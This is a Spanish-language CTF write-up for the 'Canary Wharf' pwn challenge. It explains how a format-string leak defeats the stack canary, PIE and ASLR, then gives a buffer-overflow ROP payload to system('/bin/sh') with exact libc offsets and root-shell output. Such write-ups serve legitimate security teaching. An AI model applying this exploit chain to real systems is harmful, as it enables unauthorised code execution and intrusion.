# Canary Wharf — Write-up

- **CTF:** FluidAttacks CTF 2026
- **Categoría:** Pwn · **Dificultad:** Medium
- **Flag:** `flag{d252c38ca8e5de17}`

## Enunciado

> The Fluid Banking Terminal manages accounts from the comfort of your shell.
> Every mitigation is switched on, which the devs find very reassuring.
> The flag is /flag.txt.

Se entregan el binario `bank`, su fuente `bank.c`, y la `libc.so.6` (2.35) + loader.

## 1. Protecciones y bugs

`checksec`: **PIE + Full RELRO + NX + stack canary** — todas activas. Con NX y canary,
no basta un overflow simple. Pero `bank.c` tiene **dos** bugs, y `main` es un bucle de
menú, así que en una sola conexión se puede filtrar información y luego desbordar:

1. **Format string** en `check_balance()`:
   ```c
   char note[128];
   read(0, note, 127);
   printf(note);          // <-- formato controlado por el usuario
   ```
2. **Buffer overflow** en `transfer_funds()`:
   ```c
   char amount[64];
   read(0, amount, 256);  // <-- 256 bytes en un buffer de 64
   ```

Del desensamblado: en `transfer_funds`, `amount` está en `rbp-0x50` y el canary en
`rbp-0x8`, así que el offset del buffer al canary es `0x48 = 72` bytes.

## 2. Fase de leaks (format string)

Con `%N$p` se leen valores del stack. Como la posición exacta del format string
**cambia según el entorno** (ejecución directa vs. bajo el loader), el exploit los
detecta **por firma** en vez de con índices fijos:

- **Base PIE:** el return address guardado de `main` cumple `(v & 0xfff) == 0x5e7`
  (el `call check_balance` retorna a `pie_base + 0x15e7`) → `pie_base = v - 0x15e7`.
- **Canary:** dos posiciones antes; siempre termina en el byte `00`.
- **Base libc:** con la base PIE conocemos `read@got = pie_base + 0x3fc0`. Un
  `%<pos>$s` que dereferencie esa dirección GOT filtra la dirección real de `read` en
  libc → `libc_base = read_leak - 0x114850`.

## 3. Fase de control (overflow + ROP)

Con el canary y la base de libc, se desborda `transfer_funds` preservando el canary y
se encadena una ROP a `system("/bin/sh")`:

```
payload = b"A"*72 + p64(canary) + b"B"*8
        + p64(libc + pop_rdi_ret)
        + p64(libc + binsh)
        + p64(libc + ret)          # alineación de 16 bytes
        + p64(libc + system)
```

Offsets en la libc 2.35 provista: `system=0x50d70`, `read=0x114850`,
`/bin/sh=0x1d8678`, `pop rdi; ret=0x2a3e5`.

Al retornar `transfer_funds`, se ejecuta la cadena y obtenemos shell:

```
uid=0(root) gid=0(root) groups=0(root)
$ cat /flag.txt
flag{d252c38ca8e5de17}
```

## 4. Detalle de infraestructura: TLS sobre 443

El servicio remoto **no** es un `nc` en texto plano: el binario se sirve **envuelto en
TLS sobre el puerto 443**. Un escaneo muestra solo el 443 abierto; hay que conectar con
`ncat --ssl host 443` (o envolver el socket con TLS en el exploit).

```bash
python3 exploit.py remote <host> 443    # usa TLS por defecto
```

## Lección

"Todas las mitigaciones activas" no salva a un binario con un format string: una
lectura arbitraria del stack derrota el canary, PIE y ASLR de golpe, dejando el
overflow explotable con una ROP estándar. El format string es tan peligroso como un
write primitivo cuando expone canary y punteros.
